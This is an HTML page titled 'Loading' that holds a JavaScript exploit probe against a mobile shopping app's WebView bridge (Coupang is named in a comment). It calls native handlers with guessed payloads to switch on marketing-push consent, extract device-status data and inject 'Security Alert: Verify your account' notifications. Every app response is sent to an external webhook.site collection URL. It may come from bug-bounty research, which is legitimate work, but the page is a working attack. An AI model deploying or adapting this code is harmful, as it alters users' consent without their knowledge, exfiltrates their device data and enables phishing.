<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#111;color:#0f0;padding:8px;font-size:10px}
pre{white-space:pre-wrap;word-break:break-all}
.r{color:#f55}.g{color:#4f4}.y{color:#ff0}.w{color:#fff}.c{color:#0ff}
</style>
</head>
<body>
<pre id="o"></pre>
<script>
var W="http://webhook.site/4caa46e2-bf20-4487-a734-909c66517682";
var o=document.getElementById('o');
function l(m,c){o.innerHTML+='<span class="'+(c||'')+'">'+(m||'')+'</span>\n';}

function send(tag, data) {
    try {
        navigator.sendBeacon(W+'?tag='+tag, JSON.stringify({tag:tag, data:data, time:new Date().toISOString()}));
    } catch(e){}
    try {
        new Image().src=W+'?tag='+tag+'&d='+encodeURIComponent(typeof data==='string'?data:JSON.stringify(data)).substring(0,1500);
    } catch(e){}
}

l('═══════════════════════════════════════','y');
l(' updateUserPreference Probe','y');
l('═══════════════════════════════════════','y');
l('');

// Track ALL callbacks with their IDs so we know which payload triggered what
var callbackMap = {};

window.__BRIDGE_CALLBACK = function(raw) {
    l('');
    l('[CALLBACK] ← ' + raw, 'g');
    send('callback_received', raw);
    
    // Try to match callback to probe
    try {
        var parsed = JSON.parse(raw);
        if (parsed.type && callbackMap[parsed.type]) {
            l('[MATCH] Triggered by probe: ' + callbackMap[parsed.type], 'y');
            send('callback_matched', {probe: callbackMap[parsed.type], response: raw});
        }
    } catch(e){}
};

// ═══════════════════════════════════════
// First: Check current marketing push state
// by calling isMarketingPushEnable
// ═══════════════════════════════════════
l('[Step 1] Probing isMarketingPushEnable state...','w');
l('');

var checkPayloads = [
    {type:'isMarketingPushEnable', callbackId:'check_1'},
    {type:'isMarketingPushEnable'},
    {action:'isMarketingPushEnable', callbackId:'check_2'},
    {key:'isMarketingPushEnable', callbackId:'check_3'},
    {preference:'isMarketingPushEnable', callbackId:'check_4'},
    {method:'isMarketingPushEnable', callbackId:'check_5'},
    {name:'isMarketingPushEnable', callbackId:'check_6'},
    {command:'isMarketingPushEnable', callbackId:'check_7'},
];

checkPayloads.forEach(function(p, i) {
    callbackMap['check_'+(i+1)] = JSON.stringify(p);
    setTimeout(function(){
        var json = JSON.stringify(p);
        l('[Probe check-' + (i+1) + '] ' + json, 'c');
        try {
            messageHandlers.updateUserPreference(json);
            l('  [+] accepted','g');
            send('probe_check_'+(i+1), json);
        } catch(e){ l('  [-] '+e,'r'); }
    }, i * 300);
});

// ═══════════════════════════════════════
// Then: Try to ENABLE marketing push
// (turnOnMarketingPush)
// ═══════════════════════════════════════
setTimeout(function(){
    l('');
    l('[Step 2] Probing turnOnMarketingPush...','w');
    l('  Trying multiple JSON formats...','w');
    l('');

    var pushPayloads = [
        // Format guesses based on common patterns
        {type:'turnOnMarketingPush', callbackId:'push_1'},
        {type:'turnOnMarketingPush'},
        {action:'turnOnMarketingPush', callbackId:'push_2'},
        {key:'turnOnMarketingPush', callbackId:'push_3'},
        {preference:'marketing_push', value:true, callbackId:'push_4'},
        {type:'marketing_push', enabled:true, callbackId:'push_5'},
        {marketingPush:true, callbackId:'push_6'},
        {type:'marketingPush', value:true, callbackId:'push_7'},
        {command:'turnOnMarketingPush', callbackId:'push_8'},
        {method:'turnOnMarketingPush', callbackId:'push_9'},
        {name:'turnOnMarketingPush', callbackId:'push_10'},
        
        // Korean field names (Coupang is Korean)
        {type:'마케팅푸시동의', callbackId:'push_kr1'},
        
        // Nested format
        {type:'updatePreference', data:{marketingPush:true}, callbackId:'push_11'},
        {preference:{type:'marketingPush', enabled:true}, callbackId:'push_12'},
        
        // Simple string types
        {type:'MARKETING_PUSH_ON', callbackId:'push_13'},
        {type:'marketing_push_on', callbackId:'push_14'},
    ];

    pushPayloads.forEach(function(p, i) {
        callbackMap['push_'+(i+1)] = JSON.stringify(p);
        setTimeout(function(){
            var json = JSON.stringify(p);
            l('[Probe push-' + (i+1) + '] ' + json, 'c');
            try {
                messageHandlers.updateUserPreference(json);
                l('  [+] accepted','g');
                send('probe_push_'+(i+1), json);
            } catch(e){ l('  [-] '+e,'r'); }
        }, i * 300);
    });

}, 3500);

// ═══════════════════════════════════════
// Also probe deviceStatus more thoroughly
// to see ALL data the app returns
// ═══════════════════════════════════════
setTimeout(function(){
    l('');
    l('[Step 3] Deep deviceStatus probe...','w');
    
    var dsPayloads = [
        JSON.stringify({callbackId:'ds_full'}),
        JSON.stringify({type:'deviceStatus', callbackId:'ds_type'}),
        JSON.stringify({}),
        '{}',
        JSON.stringify({callbackId:'ds_all', includeAll:true}),
    ];
    
    dsPayloads.forEach(function(p, i){
        setTimeout(function(){
            l('[DS-' + (i+1) + '] ' + p, 'c');
            try {
                messageHandlers.deviceStatus(p);
                l('  [+] sent','g');
            } catch(e){ l('  [-] '+e,'r'); }
        }, i * 500);
    });
}, 9000);

// ═══════════════════════════════════════
// Also try addLocalNotification to
// prove notification injection
// ═══════════════════════════════════════
setTimeout(function(){
    l('');
    l('[Step 4] Notification injection test...','w');
    
    var notifPayloads = [
        {title:"Security Alert", body:"Verify your account", callbackId:'notif_1'},
        {title:"Security Alert", body:"Verify your account", scheduledTime:Date.now()+3000, callbackId:'notif_2'},
        {type:'addLocalNotification', title:"Test", body:"Notification injection", callbackId:'notif_3'},
        {pushTitle:"Alert", pushBody:"Test notification", callbackId:'notif_4'},
        {message:{title:"Alert", body:"Test"}, callbackId:'notif_5'},
    ];
    
    notifPayloads.forEach(function(p, i){
        setTimeout(function(){
            var json = JSON.stringify(p);
            l('[Notif-' + (i+1) + '] ' + json, 'c');
            try {
                messageHandlers.addLocalNotification(json);
                l('  [+] sent','g');
                send('notif_'+(i+1), json);
            } catch(e){ l('  [-] '+e,'r'); }
        }, i * 500);
    });
}, 12000);

// Final summary
setTimeout(function(){
    l('');
    l('═══════════════════════════════════════','y');
    l(' All probes complete.','y');
    l(' Check webhook.site for:','y');
    l('  ?tag=callback_received  ← raw app responses','c');
    l('  ?tag=callback_matched   ← which probe worked','c');
    l('  ?tag=probe_push_*       ← push preference probes','c');
    l('  ?tag=notif_*            ← notification probes','c');
    l('═══════════════════════════════════════','y');
}, 16000);
</script>
</body>
</html>
